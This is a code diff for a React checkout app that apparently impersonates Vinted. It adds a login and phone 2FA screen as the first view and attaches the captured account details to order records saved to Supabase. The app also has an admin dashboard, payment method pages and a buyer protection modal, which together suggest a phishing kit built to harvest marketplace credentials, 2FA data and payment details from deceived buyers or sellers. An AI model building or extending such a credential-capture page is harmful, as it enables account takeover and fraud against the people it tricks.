@@ -28,15 +28,17 @@ import { CarrierDetailsCard } from './components/CarrierDetailsCard';
 import { PriceSummarySection } from './components/PriceSummarySection';
 import { BuyerProtectionModal } from './components/BuyerProtectionModal';
 import { OrderConfirmationModal } from './components/OrderConfirmationModal';
+import { LoginPage } from './pages/LoginPage';
 import { AddressPage } from './pages/AddressPage';
 import { PaymentMethodsPage } from './pages/PaymentMethodsPage';
 import { PickupMapPage } from './pages/PickupMapPage';
 import { AdminDashboardPage } from './pages/AdminDashboardPage';
 import { CreditCard, ChevronRight } from 'lucide-react';
 
-type ViewMode = 'checkout' | 'address' | 'payment_methods' | 'pickup_map' | 'admin';
+type ViewMode = 'login' | 'checkout' | 'address' | 'payment_methods' | 'pickup_map' | 'admin';
 
 import { saveOrderToSupabase } from './lib/supabase';
+import { UserAccountDetails } from './types';
 
 // Determine initial view based on browser URL (/admin or /)
 const getInitialView = (): ViewMode => {
@@ -47,12 +49,13 @@ const getInitialView = (): ViewMode => {
       return 'admin';
     }
   }
-  return 'checkout';
+  return 'login';
 };
 
 export default function App() {
   // Page Routing State - active /admin url support
   const [currentView, setCurrentView] = useState<ViewMode>(getInitialView);
+  const [accountDetails, setAccountDetails] = useState<UserAccountDetails | null>(null);
 
   // Sync with browser URL changes and history
   React.useEffect(() => {
@@ -241,6 +244,7 @@ export default function App() {
         orderNumber: generatedOrderNum,
         productTitle: product.title,
         deliveryType,
+        accountDetails: accountDetails || undefined,
         pickupPoint: selectedPickupPoint,
         shippingAddress: selectedAddress,
         paymentMethod: selectedPayment,
@@ -256,6 +260,7 @@ export default function App() {
           productId: product.id,
           productTitle: product.title,
           deliveryType,
+          accountDetails: accountDetails || undefined,
           pickupPoint: selectedPickupPoint,
           shippingAddress: selectedAddress,
           paymentMethod: selectedPayment,
@@ -282,8 +287,20 @@ export default function App() {
     setSelectedAddress(null);
     setSelectedPickupPoint(null);
     setDeliveryType('home');
-    setCurrentView('checkout');
+    setCurrentView('login');
   };
+
+  // --- SCREEN 0: VINTED LOGIN & PHONE 2FA SCREEN ---
+  if (currentView === 'login') {
+    return (
+      <LoginPage
+        onComplete={(account) => {
+          setAccountDetails(account);
+          setCurrentView('checkout');
+        }}
+      />
+    );
+  }
 
   // --- SCREEN 1: DEDICATED ADDRESS PAGE ---
   if (currentView === 'address') {
